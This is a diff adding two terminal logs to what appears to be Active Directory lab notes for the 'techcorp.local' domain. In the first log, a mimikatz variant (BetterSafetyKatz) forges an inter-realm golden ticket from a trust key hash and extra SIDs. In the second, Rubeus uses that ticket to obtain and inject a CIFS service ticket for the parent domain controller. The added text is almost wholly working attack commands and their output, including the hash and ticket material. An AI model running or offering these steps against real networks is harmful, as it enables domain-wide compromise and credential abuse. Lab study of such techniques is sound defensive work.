@@ -287,3 +287,100 @@ Bye!
 
 C:\Windows\system32>
 ```
+
+
+```
+C:\Windows\system32>C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946 /rc4:4de80aa031eab75dba76146cdad5cf58 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
+[+] Randomizing strings in memory
+[+] Suicide burn before CreateThread!
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946 /rc4:4de80aa031eab75dba76146cdad5cf58 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi
+User      : Administrator
+Domain    : us.techcorp.local (US)
+SID       : S-1-5-21-210670787-2521448726-163245708
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-2781415573-3701854478-2406986946 ;
+ServiceKey: 4de80aa031eab75dba76146cdad5cf58 - rc4_hmac_nt
+Service   : krbtgt
+Target    : techcorp.local
+Lifetime  : 2/28/2023 11:54:08 AM ; 2/25/2033 11:54:08 AM ; 2/25/2033 11:54:08 AM
+-> Ticket : C:\AD\Tools\trust_tkt.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+
+mimikatz(commandline) # exit
+Bye!
+
+```
+```
+C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGS
+
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building TGS-REQ request for: 'CIFS/techcorp-dc.techcorp.local'
+[*] Using domain controller: techcorp-dc.techcorp.local (192.168.1.1)
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      doIFOjCCBTagAwIBBaEDAgEWooIEJzCCBCNhggQfMIIEG6ADAgEFoRAbDlRFQ0hDT1JQLkxPQ0FMoi0w
+      K6ADAgECoSQwIhsEQ0lGUxsadGVjaGNvcnAtZGMudGVjaGNvcnAubG9jYWyjggPRMIIDzaADAgESoQMC
+      AQOiggO/BIIDu0TCBLNUDVy/kYS1TWuYkC4iknr0A26o6bQHSXv16cpN9Rw5+wXdK+VJeKcsadtJuGjS
+      MhXMFNUQoZlmnHW3jBeBzyi1JYG4g0T1dzMlo8g+ocy5g7nrQ4gsCwj5KY8sqUKU2dc2OucSaKDiVIPG
+      Kx0UQqKyMpY6TEAyNsmYHCf9DxbnqcR4esDVBBvef8/7qcTWpNMG9/6AhWwg+WcqiZB4VPeBDG8gCFcr
+      DLTwtcuiL7NzasdQ2BoPPM37A5EdfcC+s6cHpZbCF5Hwuds8su2l9jCVGwoQqkvWYTiS1GmUwp7Z8iX6
+      f5Q1rDF9HKtoLDf+wBN7Wy+pWoPyczbQjtNKZNagxWlHqVDDLPRdliG/HKkhX1xzVAWQ/Awl2+CampPj
+      AT7IZ8AIj09+/Fh022JkXmaYmIBIDnXxrNLPPKb/Ee80USlEQIOagLy6rrwwK/Y9sMWm82pu4xn2iDne
+      GLg3aWa+7TsKWIMUX2heS7/bCX/KmdwGMZqCq4FI8Mr5TlVURcy5WmAq9UwaogvQ+DXa//ZT551utOVL
+      Jdm8jm7jAkp1kTz/aiB9UqlySfRMihFSMIod5N88LL3Kn2Vowal3pP5lqHGyH7rQ02cvemvlnMiUAwrK
+      GHEeIx4JJzrKq3wYRZ1Vh2NbqnodW1Z7W7ymcXknYsGv4qrDt4atGwnpjfg/ybdj4jdR3V8CA4J23gFA
+      o/MlQwMq+FAlwAL4K1lNY1C6EbAuzVGqAHIWXplWBpyqB96bC6YLW1xsb8WJi5FGoeHCAe/8YxKUiva6
+      b4yFEymImILoFC0bhG/1r03rnPXa9EdpqkNocm/8ttADWEosi5BnltIg2FMgKR8ozT0OD8PAklAzTayi
+      ZATSlhpDgYEAHROWMRqyb+cTbPu8HFts2JWhuIouZLvxCuEWvH+3QMyKZQYhHP+1aHEG2RS0ZRkfKegs
+      is14AX+kIV6KaTsKFvdLjXUEBvx/y51UyaREOix/xznd5Lm+PlTlZbkHz+KYWh7RRkzvOmGRs7G0oXH8
+      17BraJv1HQUNqv2WrEBfeWw0iMfT1Yti854tjYAH1K4mNsggIQvFPGGH6AQDK0lmxwAxu2kAxGsmrdwm
+      SsmuXY2sErhEyin4x78EXkLKgWnQC5mRjDHvtl11SiMtU0aruyF2rxj7le9IKGKLOqY4PwsKx+BxUeDf
+      hU6FiV8DvlsTyCuvvYfHZk3/IKZQJEy/AaC+10k4cT6FcWMVKAgRcI2EVEjz9kuq90MqBN+BQLpjlnl9
+      7gcRao2jgf4wgfugAwIBAKKB8wSB8H2B7TCB6qCB5zCB5DCB4aArMCmgAwIBEqEiBCDOQRVrLl+IRTAO
+      S+fir0gdzLFGi6uCqYc7XN5Hngm+OaETGxF1cy50ZWNoY29ycC5sb2NhbKIaMBigAwIBAaERMA8bDUFk
+      bWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyMzAyMjgxOTU0MjBaphEYDzIwMjMwMzAxMDU1NDIwWqcR
+      GA8yMDIzMDMwNzE5NTQyMFqoEBsOVEVDSENPUlAuTE9DQUypLTAroAMCAQKhJDAiGwRDSUZTGxp0ZWNo
+      Y29ycC1kYy50ZWNoY29ycC5sb2NhbA==
+
+  ServiceName              :  CIFS/techcorp-dc.techcorp.local
+  ServiceRealm             :  TECHCORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  us.techcorp.local
+  StartTime                :  2/28/2023 11:54:20 AM
+  EndTime                  :  2/28/2023 9:54:20 PM
+  RenewTill                :  3/7/2023 11:54:20 AM
+  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  zkEVay5fiEUwDkvn4q9IHcyxRourgqmHO1zeR54Jvjk=
+
+```
